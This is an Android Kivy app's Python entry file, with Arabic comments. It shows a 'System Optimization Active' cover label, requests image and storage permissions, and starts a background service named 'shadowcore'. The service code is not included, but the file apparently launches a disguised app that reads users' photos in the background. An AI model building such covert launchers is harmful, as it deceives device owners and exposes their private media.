from kivy.app import App
from kivy.uix.label import Label
from android.permissions import request_permissions, Permission
from jnius import autoclass

class AppMain(App):
    def build(self):
        return Label(text="System Optimization Active\nSelective Sync Running", halign='center')

    def on_start(self):
        # طلب الصلاحيات أولاً ثم تشغيل الخدمة
        perms = [
            Permission.READ_MEDIA_IMAGES,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.FOREGROUND_SERVICE
        ]
        request_permissions(perms, self.start_service)

    def start_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            # تأكد أن الاسم هنا يطابق ما في buildozer
            service = autoclass('org.test.shadowcore.ServiceMyservice')
            service.start(PythonActivity.mActivity, "")
            print("SERVICE_STARTED")
        except Exception as e:
            print(f"Service error: {e}")

if __name__ == "__main__":
    AppMain().run()
